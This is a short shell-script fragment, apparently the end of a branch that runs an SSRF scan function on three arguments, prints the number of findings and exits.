    findings=$(scan_ssrf "$1" "$2" "$3")
    echo "FINDINGS_COUNT=$findings"
    exit 0
fi
